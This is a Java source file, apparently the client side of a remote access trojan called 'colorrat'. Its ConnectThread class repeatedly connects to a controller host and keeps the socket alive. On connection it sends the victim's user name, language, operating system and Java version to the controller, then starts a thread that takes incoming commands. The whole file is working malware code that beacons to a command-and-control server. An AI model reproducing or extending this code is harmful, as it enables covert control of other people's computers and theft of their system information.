package eu.aragonapp.colorrat.network.thread.types;

import eu.aragonapp.colorrat.ColorClient;
import eu.aragonapp.colorrat.network.packet.types.client.C01PacketInformations;
import eu.aragonapp.colorrat.network.thread.ColorThread;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;

/**
 * @Copyright (c) 2018 Mythic Inc. (http://www.mythic.com/) All Rights Reserved.
 * <p>
 * Mythic Inc. licenses this file to you under the Apache License,
 * @Version 2.0 (the "License"); you may not use this file except
 * in compliance with the License.
 * You may obtain a copy of the License at
 * @https://www.apache.org/licenses/LICENSE-2.0
 */
public class ConnectThread extends ColorThread {

    public ConnectThread() {
        super("Connect-Thread");
    }

    @Override
    public void update() {
        if(ColorClient.getInstance().isConnected()) return;

        ColorClient.getInstance().stop();


        if(connect()) {
            try {
                ColorClient.getInstance().setOutputStream(new ObjectOutputStream(ColorClient.getInstance().getSocket().getOutputStream()));
                ColorClient.getInstance().setInputStream(new ObjectInputStream(ColorClient.getInstance().getSocket().getInputStream()));
            } catch (Exception ex) {
                ex.printStackTrace();
                return;
            }

            ColorClient.getInstance().setReceiveThread(new ReceiveThread());
            ColorClient.getInstance().getReceiveThread().start();

            ColorClient.getInstance().write(new C01PacketInformations(System.getProperty("user.name"), System.getProperty("user.language"), System.getProperty("os.name"), System.getProperty("java.version")));
        }

        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private boolean connect() {
        try {
            ColorClient.getInstance().setSocket(new Socket(ColorClient.getInstance().getAddress(), ColorClient.getInstance().getPort()));
            ColorClient.getInstance().getSocket().setKeepAlive(true);
            ColorClient.getInstance().setConnected(true);
            return true;
        } catch (Exception ex) {
            ColorClient.getInstance().setConnected(false);
            return false;
        }
    }

}
